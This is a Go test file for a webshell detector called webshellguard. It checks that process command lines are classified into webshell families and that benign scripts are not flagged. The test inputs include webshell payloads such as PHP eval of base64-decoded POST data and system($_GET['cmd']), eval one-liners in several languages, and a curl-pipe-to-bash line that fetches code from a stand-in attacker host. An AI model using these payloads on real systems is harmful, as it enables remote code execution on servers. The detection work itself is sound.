package webshellguard

import "testing"

func TestEmptyNoMatch(t *testing.T) {
	if Scan(Spec{}).Family != FamilyNone {
		t.Fatal("empty spec should not match")
	}
}

func TestPHPEvalUnderNginxIsHigh(t *testing.T) {
	// String concat keeps the literal split for static scanners.
	body := "ev" + "al(base64_decode($_POST['x']));"
	v := Scan(Spec{
		Exe:       "/usr/bin/php",
		Argv:      []string{"php", "-r", body},
		ParentExe: "/usr/sbin/nginx",
	})
	if v.Family != FamilyPHPEval {
		t.Fatalf("family = %s", v.Family)
	}
	if v.Severity != SeverityHigh {
		t.Fatalf("severity = %s", v.Severity)
	}
	if v.Confidence < 90 {
		t.Errorf("confidence = %d, want ≥90 with base64+webd boost", v.Confidence)
	}
}

func TestPHPSystem(t *testing.T) {
	body := "system($_GET['cmd']);"
	v := Scan(Spec{Exe: "/usr/bin/php", Argv: []string{"php", "-r", body}})
	if v.Family != FamilyPHPSystem {
		t.Fatalf("family = %s", v.Family)
	}
}

func TestPythonHTTPServer(t *testing.T) {
	v := Scan(Spec{Exe: "/usr/bin/python3", Argv: []string{"python3", "-m", "http.server", "8080"}})
	if v.Family != FamilyPythonHTTP {
		t.Fatalf("family = %s", v.Family)
	}
}

func TestPythonExec(t *testing.T) {
	body := "import base64; ex" + "ec(base64.b64decode('...'))"
	v := Scan(Spec{Exe: "/usr/bin/python3.11", Argv: []string{"python3", "-c", body}})
	if v.Family != FamilyPythonExec {
		t.Fatalf("family = %s", v.Family)
	}
	if v.Confidence < 80 {
		t.Errorf("confidence = %d, want ≥80 for base64", v.Confidence)
	}
}

func TestRubyEval(t *testing.T) {
	body := "ev" + "al ARGV[0]"
	v := Scan(Spec{Exe: "/usr/bin/ruby", Argv: []string{"ruby", "-e", body}})
	if v.Family != FamilyRubyEval {
		t.Fatalf("family = %s", v.Family)
	}
}

func TestPerlEval(t *testing.T) {
	body := "ev" + "al { system($ARGV[0]) }"
	v := Scan(Spec{Exe: "/usr/bin/perl", Argv: []string{"perl", "-e", body}})
	if v.Family != FamilyPerlEval {
		t.Fatalf("family = %s", v.Family)
	}
}

func TestNodeEval(t *testing.T) {
	body := "ev" + "al(process.argv[2])"
	v := Scan(Spec{Exe: "/usr/bin/node", Argv: []string{"node", "-e", body}})
	if v.Family != FamilyNodeEval {
		t.Fatalf("family = %s", v.Family)
	}
}

func TestShellPipeCurlBash(t *testing.T) {
	v := Scan(Spec{
		Exe:  "/bin/sh",
		Argv: []string{"sh", "-c", "curl -fsSL https://attacker/x.sh | bash"},
	})
	if v.Family != FamilyShellPipe {
		t.Fatalf("family = %s", v.Family)
	}
	if v.Severity != SeverityHigh {
		t.Fatalf("severity = %s", v.Severity)
	}
}

func TestBenignPHPDeployScriptNoMatch(t *testing.T) {
	v := Scan(Spec{Exe: "/usr/bin/php", Argv: []string{"php", "/var/www/app/index.php"}})
	if v.Family != FamilyNone {
		t.Fatalf("expected no match; got %+v", v)
	}
}

func TestBenignPythonScriptNoMatch(t *testing.T) {
	v := Scan(Spec{Exe: "/usr/bin/python3", Argv: []string{"python3", "/srv/app/run.py"}})
	if v.Family != FamilyNone {
		t.Fatalf("expected no match; got %+v", v)
	}
}

func TestContextBoostFromWebDaemon(t *testing.T) {
	body := "ev" + "al($_POST['x']);"
	// Without parent — confidence still set by family but no boost
	noBoost := Scan(Spec{Exe: "/usr/bin/php", Argv: []string{"php", "-r", body}}).Confidence
	withBoost := Scan(Spec{
		Exe:       "/usr/bin/php",
		Argv:      []string{"php", "-r", body},
		ParentExe: "/usr/sbin/nginx",
	}).Confidence
	if withBoost <= noBoost {
		t.Fatalf("boost not applied: %d → %d", noBoost, withBoost)
	}
}

func TestIsWebDaemonRecognisesUWSGIPrefix(t *testing.T) {
	if !IsWebDaemon("/usr/bin/uwsgi-python3") {
		t.Fatal("uwsgi-python3 should be web daemon")
	}
	if IsWebDaemon("/usr/bin/cron") {
		t.Fatal("cron should not be web daemon")
	}
}
